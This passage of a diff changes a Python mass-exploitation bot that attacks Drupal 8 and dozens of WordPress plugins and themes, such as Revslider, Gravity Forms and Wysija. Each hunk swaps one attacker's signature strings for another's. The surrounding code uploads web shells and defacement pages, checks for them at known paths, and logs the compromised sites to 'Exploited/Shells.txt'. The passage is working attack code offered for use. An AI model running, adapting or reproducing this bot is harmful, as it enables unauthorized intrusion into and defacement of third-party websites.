 			ar = requests.post(url+'/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, timeout=5)
-			if 'Defaced  By Mister Spy' in requests.get(url+'/def.htm', headers=headers).text:
+			if 'Defaced  By MarGus' in requests.get(url+'/def.htm', headers=headers).text:
 				print '\033[92m[>] \033[0mExploit Drupal 8 Index  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')
 				sys.exit()
@@ -1288,7 +1251,7 @@ def botv1():
 			jssorlib = requests.get(url+'/wp-content/jssor-slider/jssor-uploads/'+indecx)
 			
 			
-			if 'Mister Spy' in jssorlib.content:
+			if 'MarGus' in jssorlib.content:
 				print '\033[92m[>] \033[0mExploit Jssor Slider  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Index.txt', 'a').write(url+'/wp-content/jssor-slider/jssor-uploads/'+indecx+'\n')
 			else:
@@ -1389,7 +1352,7 @@ def botv1():
 			Wysijalib = requests.get(url+'/wp-content/uploads/wysija/themes/Master/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Wysijalib.content:
+			if 'MarGusFRom1337School' in Wysijalib.content:
 				print '\033[92m[>] \033[0mExploit wysija  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/Master/up.php'+'\n')
 			else:
@@ -1413,7 +1376,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019 ' in LearnDashlib.content:
+			if 'MarGusFRom1337School ' in LearnDashlib.content:
 				print '\033[92m[>] \033[0mExploit assignments  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/assignments/'+filenamex.replace('.php.php', '.php.')+'\n')
 			else:
@@ -1527,7 +1490,7 @@ def botv1():
 			Gravkglib = requests.get(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravkglib.content:
+			if 'MarGusFRom1337School' in Gravkglib.content:
 				print '\033[92m[>] \033[0mExploit Qualifire  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames+'\n')
 				sys.exit()
@@ -1545,7 +1508,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Coldfusion  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
 				sys.exit()
@@ -1562,7 +1525,7 @@ def botv1():
 			aReflexlib = requests.get(url+'/wp-content/files_mf/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aReflexlib.content:
+			if 'MarGusFRom1337School' in aReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Magic-Fields  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/files_mf/'+filenames+'\n')
 				sys.exit()
@@ -1579,7 +1542,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Ghost  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
 				sys.exit()
@@ -1600,7 +1563,7 @@ def botv1():
 			Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
 			Gravlib = requests.get(url+'/wp-content/uploads/_input_3_Mah.phtml')
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravlib.content:
+			if 'MarGusFRom1337School' in Gravlib.content:
 				print '\033[92m[>] \033[0mExploit Gravity  \033[92m[Done] '.format(sn)
 				open('Exploited/Index.txt', 'a').write(url+'/wp-content/uploads/_input_3_Mah.phtml'+'\n')
 			else:
@@ -1618,7 +1581,7 @@ def botv1():
 			Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
 			Gravlib = requests.get(url+'/wp-content/_input_3_Mah.php5')
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravlib.content:
+			if 'MarGusFRom1337School' in Gravlib.content:
 				print '\033[92m[>] \033[0mExploit Gravity PHP  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/_input_3_Mah.php5'+'\n')
 			else:
@@ -1661,7 +1624,7 @@ def botv1():
 			Gravklib = requests.get(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravklib.content:
+			if 'MarGusFRom1337School' in Gravklib.content:
 				print '\033[92m[>] \033[0mExploit Networking-E-Commerce   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/'+filenames+'\n')
 				sys.exit()
@@ -1686,7 +1649,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit Revslider  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1710,7 +1673,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit Avada  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1734,7 +1697,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit Striking_r  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1757,7 +1720,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit IncredibleWP  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1781,7 +1744,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit ultimatum  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1805,7 +1768,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit medicate  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1829,7 +1792,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit centum  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/centum/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1853,7 +1816,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit beach_apollo  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1876,7 +1839,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit Cuckootap  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1901,7 +1864,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit pindol  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/pindol/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1925,7 +1888,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit designplus  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1948,7 +1911,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit rarebird  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1971,7 +1934,7 @@ def botv1():
 			
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in revsliderlib.content:
+			if 'MarGusFRom1337School' in revsliderlib.content:
 				print '\033[92m[>] \033[0mExploit andre  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -1991,7 +1954,7 @@ def botv1():
 			
 			showbizlib = requests.get(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames)
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in showbizlib.content:
+			if 'MarGusFRom1337School' in showbizlib.content:
 				print '\033[92m[>] \033[0mExploit showbiz  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames+'\n')
 				sys.exit()
@@ -2008,7 +1971,7 @@ def botv1():
 			Reflexlib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Reflexlib.content:
+			if 'MarGusFRom1337School' in Reflexlib.content:
 				print '\033[92m[>] \033[0mExploit Reflex Gallery  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
 				sys.exit()
@@ -2034,7 +1997,7 @@ def botv1():
 			Wysijalib = requests.get(url+'/wp-content/uploads/wysija/themes/Master/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Wysijalib.content:
+			if 'MarGusFRom1337School' in Wysijalib.content:
 				print '\033[92m[>] \033[0mExploit Wysija  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/Master/up.php'+'\n')
 				sys.exit()
@@ -2053,7 +2016,7 @@ def botv1():
 			
 			Tevorlib = requests.get(url+'/wp-content/themes/Directory/images/tmp/'+filenames)
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Tevorlib.content:
+			if 'MarGusFRom1337School' in Tevorlib.content:
 				print '\033[92m[>] \033[0mExploit Tevolution  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/Directory/images/tmp/'+filenames+'\n')
 				sys.exit()
@@ -2071,7 +2034,7 @@ def botv1():
 			Cherrylib = requests.get(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Cherrylib.content:
+			if 'MarGusFRom1337School' in Cherrylib.content:
 				print '\033[92m[>] \033[0mExploit Cherry Plugin  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames+'\n')
 				sys.exit()
@@ -2101,7 +2064,7 @@ def botv1():
 			propertylib = requests.get(url+'/wp-content/plugins/wp-property/third-party/uploadify/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in propertylib.content:
+			if 'MarGusFRom1337School' in propertylib.content:
 				print '\033[92m[>] \033[0mExploit WP Property  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/wp-property/third-party/uploadify/'+filenames+'\n')
 				sys.exit()
@@ -2122,7 +2085,7 @@ def botv1():
 			simplelib = requests.get(url+'/wp-content/plugins/simple-ads-manager/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in simplelib.content:
+			if 'MarGusFRom1337School' in simplelib.content:
 				print '\033[92m[>] \033[0mExploit Ads Manager  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/simple-ads-manager/'+filenames+'\n')
 				sys.exit()
@@ -2141,7 +2104,7 @@ def botv1():
 			dayilib = requests.get(url+'/wp-content/plugins/dzs-videogallery/admin/upload/'+filenames+'\n')
 			
 			
-			if 'Hacked By Mister Spy' in dayilib.content:
+			if 'Hacked By MarGus' in dayilib.content:
 				print '\033[92m[>] \033[0mExploit Dzs Videogallery   \033[92m[Done] '.format(sn)
 				open('Exploited/Dzs.txt', 'a').write(url+'/wp-content/plugins/dzs-videogallery/admin/upload/'+filenames+'\n')
 				sys.exit()
@@ -2160,7 +2123,7 @@ def botv1():
 			eptoniclib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in eptoniclib.content:
+			if 'MarGusFRom1337School' in eptoniclib.content:
 				print '\033[92m[>] \033[0mExploit Eptonic   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
 				sys.exit()
@@ -2177,7 +2140,7 @@ def botv1():
 			saicolib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in saicolib.content:
+			if 'MarGusFRom1337School' in saicolib.content:
 				print '\033[92m[>] \033[0mExploit Saico   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
 				sys.exit()
@@ -2194,7 +2157,7 @@ def botv1():
 			barclaycartlib = requests.get(url+'/wp-content/plugins/barclaycart/uploadify/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in barclaycartlib.content:
+			if 'MarGusFRom1337School' in barclaycartlib.content:
 				print '\033[92m[>] \033[0mExploit Barclaycart   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/barclaycart/uploadify/'+filenames+'\n')
 				sys.exit()
@@ -2211,7 +2174,7 @@ def botv1():
 			sexylib = requests.get(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sexylib.content:
+			if 'MarGusFRom1337School' in sexylib.content:
 				print '\033[92m[>] \033[0mExploit Sexy-Cntact-Form   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames+'\n')
 				sys.exit()
@@ -2228,7 +2191,7 @@ def botv1():
 			pinboardlib = requests.get(url+'/wp-content/themes/pinboard/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in pinboardlib.content:
+			if 'MarGusFRom1337School' in pinboardlib.content:
 				print '\033[92m[>] \033[0mExploit Pinboard   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/pinboard/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2245,7 +2208,7 @@ def botv1():
 			pitchprintlib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in pitchprintlib.content:
+			if 'MarGusFRom1337School' in pitchprintlib.content:
 				print '\033[92m[>] \033[0mExploit Pitchprint   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
 				sys.exit()
@@ -2262,7 +2225,7 @@ def botv1():
 			evolvelib = requests.get(url+'/wp-content/uploads/2018/12/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in evolvelib.content:
+			if 'MarGusFRom1337School' in evolvelib.content:
 				print '\033[92m[>] \033[0mExploit Evolve   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/12/'+filenames+'\n')
 				sys.exit()
@@ -2279,7 +2242,7 @@ def botv1():
 			satoshilib = requests.get(url+'/wp-content/satoshi/images/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in satoshilib.content:
+			if 'MarGusFRom1337School' in satoshilib.content:
 				print '\033[92m[>] \033[0mExploit Satoshi   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/satoshi/images/'+filenames+'\n')
 				sys.exit()
@@ -2296,7 +2259,7 @@ def botv1():
 			dandelionlib = requests.get(url+'/uploads/[years]/[month]/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dandelionlib.content:
+			if 'MarGusFRom1337School' in dandelionlib.content:
 				print '\033[92m[>] \033[0mExploit Dandelion   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/uploads/[years]/[month]/'+filenames+'\n')
 				sys.exit()
@@ -2313,7 +2276,7 @@ def botv1():
 			highlightlib = requests.get(url+'/uploads/[years]/[month]/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in highlightlib.content:
+			if 'MarGusFRom1337School' in highlightlib.content:
 				print '\033[92m[>] \033[0mExploit Highlight   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/uploads/[years]/[month]/'+filenames+'\n')
 				sys.exit()
@@ -2330,7 +2293,7 @@ def botv1():
 			ithemeslib = requests.get(url+'/wp-content/themes/ithemes2/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in ithemeslib.content:
+			if 'MarGusFRom1337School' in ithemeslib.content:
 				print '\033[92m[>] \033[0mExploit Ithemes2   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/ithemes2/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2347,7 +2310,7 @@ def botv1():
 			customlib = requests.get(url+'/wp-content/plugins/custom-background/uploadify/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in customlib.content:
+			if 'MarGusFRom1337School' in customlib.content:
 				print '\033[92m[>] \033[0mExploit Custom Background   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/custom-background/uploadify/'+filenames+'\n')
 				sys.exit()
@@ -2364,7 +2327,7 @@ def botv1():
 			ampluslib = requests.get(url+'/uploads/[years]/[month]/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in ampluslib.content:
+			if 'MarGusFRom1337School' in ampluslib.content:
 				print '\033[92m[>] \033[0mExploit Amplus   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/uploads/[years]/[month]/'+filenames+'\n')
 				sys.exit()
@@ -2381,7 +2344,7 @@ def botv1():
 			cnhklib = requests.get(url+'/wp-content/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in cnhklib.content:
+			if 'MarGusFRom1337School' in cnhklib.content:
 				print '\033[92m[>] \033[0mExploit Cnhk Slideshow   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2398,7 +2361,7 @@ def botv1():
 			assetlib = requests.get(url+'/wp-content/uploads/assets/temp/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in assetlib.content:
+			if 'MarGusFRom1337School' in assetlib.content:
 				print '\033[92m[>] \033[0mExploit Asset Manager   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/assets/temp/'+filenames+'\n')
 				sys.exit()
@@ -2417,7 +2380,7 @@ def botv1():
 			sonzlib = requests.get(url+'/wp-content/uploads/user_uploads/test/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzlib.content:
+			if 'MarGusFRom1337School' in sonzlib.content:
 				print '\033[92m[>] \033[0mExploit Private Conversation   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/user_uploads/test/'+filenames+'\n')
 				sys.exit()
@@ -2434,7 +2397,7 @@ def botv1():
 			cubedslib = requests.get(url+'/wp-content/uploads/year/month/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in cubedslib.content:
+			if 'MarGusFRom1337School' in cubedslib.content:
 				print '\033[92m[>] \033[0mExploit Cubed V1.2   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/year/month/'+filenames+'\n')
 				sys.exit()
@@ -2451,7 +2414,7 @@ def botv1():
 			flipbooklib = requests.get(url+'/wp-includes/fb-images/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in flipbooklib.content:
+			if 'MarGusFRom1337School' in flipbooklib.content:
 				print '\033[92m[>] \033[0mExploit Flipbook   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-includes/fb-images/'+filenames+'\n')
 				sys.exit()
@@ -2468,7 +2431,7 @@ def botv1():
 			wpstorelib = requests.get(url+'/wp-content/uploads/wpstorecart/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in wpstorelib.content:
+			if 'MarGusFRom1337School' in wpstorelib.content:
 				print '\033[92m[>] \033[0mExploit Wpstorecart   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wpstorecart/'+filenames+'\n')
 				sys.exit()
@@ -2485,7 +2448,7 @@ def botv1():
 			dancelib = requests.get(url+'/wp-content/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dancelib.content:
+			if 'MarGusFRom1337School' in dancelib.content:
 				print '\033[92m[>] \033[0mExploit Dance Studio   \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2502,7 +2465,7 @@ def botv1():
 			designlib = requests.get(url+'/patch/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in designlib.content:
+			if 'MarGusFRom1337School' in designlib.content:
 				print '\033[92m[>] \033[0mExploit Udesign    \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/patch/'+filenames+'\n')
 				sys.exit()
@@ -2519,7 +2482,7 @@ def botv1():
 			wpshoplib = requests.get(url+'/wp-content/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in wpshoplib.content:
+			if 'MarGusFRom1337School' in wpshoplib.content:
 				print '\033[92m[>] \033[0mExploit Wpshop    \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2536,7 +2499,7 @@ def botv1():
 			symposiumlib = requests.get(url+'/wp-content/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in symposiumlib.content:
+			if 'MarGusFRom1337School' in symposiumlib.content:
 				print '\033[92m[>] \033[0mExploit Symposium    \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2553,7 +2516,7 @@ def botv1():
 			formcraftlib = requests.get(url+'/wp-content/plugins/formcraft/file-upload/server/php/files/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in formcraftlib.content:
+			if 'MarGusFRom1337School' in formcraftlib.content:
 				print '\033[92m[>] \033[0mExploit Formcraft    \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/formcraft/file-upload/server/php/files/'+filenames+'\n')
 				sys.exit()
@@ -2570,7 +2533,7 @@ def botv1():
 			picalib = requests.get(url+'/wp-content/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in picalib.content:
+			if 'MarGusFRom1337School' in picalib.content:
 				print '\033[92m[>] \033[0mExploit Pica Photo Gallery    \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2591,7 +2554,7 @@ def botv1():
 			sonzslib = requests.get(url+'/wp-content/uploads/contact_files/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzslib.content:
+			if 'MarGusFRom1337School' in sonzslib.content:
 				print '\033[92m[>] \033[0mExploit N-media Contact    \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/contact_files/'+filenames+'\n')
 				sys.exit()
@@ -2636,7 +2599,7 @@ def botv1():
 			sonzsxlib = requests.get(url+'/wp-content/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzsxlib.content:
+			if 'MarGusFRom1337School' in sonzsxlib.content:
 				print '\033[92m[>] \033[0mExploit Copysafe    \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2655,7 +2618,7 @@ def botv1():
 			sonzsdlib = requests.get(url+"/wp-content/uploads/wpallimport/uploads/"+str(path_dir)+"/Vuln.php")
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzsdlib.content:
+			if 'MarGusFRom1337School' in sonzsdlib.content:
 				print '\033[92m[>] \033[0mExploit Wpallimport    \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wpallimport/uploads/'+path_dir+'/Vuln.php'+'\n')
 				sys.exit()
@@ -2671,7 +2634,7 @@ def botv1():
 			izflib = requests.get(url+'/wp-content/uploads/2018/01/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in izflib.content:
+			if 'MarGusFRom1337School' in izflib.content:
 				print '\033[92m[>] \033[0mExploit Woocommerce    \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/01/up.php'+'\n')
 				sys.exit()
@@ -2688,7 +2651,7 @@ def botv1():
 			acflib = requests.get(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-white/designit/cs/uploadImage/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in acflib.content:
+			if 'MarGusFRom1337School' in acflib.content:
 				print '\033[92m[>] \033[0mExploit woocommerce-custom-t-shirt-designer    \033[92m[Done]  '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-white/designit/cs/uploadImage/'+filenames+'\n')
 				sys.exit()
@@ -2704,7 +2667,7 @@ def botv1():
 			acflib = requests.get(url+'/wp-content/uploads/uigen_.year./'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in acflib.content:
